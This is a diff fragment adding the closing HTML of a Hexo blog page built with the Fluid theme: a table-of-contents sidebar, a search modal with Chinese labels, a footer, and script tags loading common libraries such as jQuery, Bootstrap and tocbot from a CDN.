+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
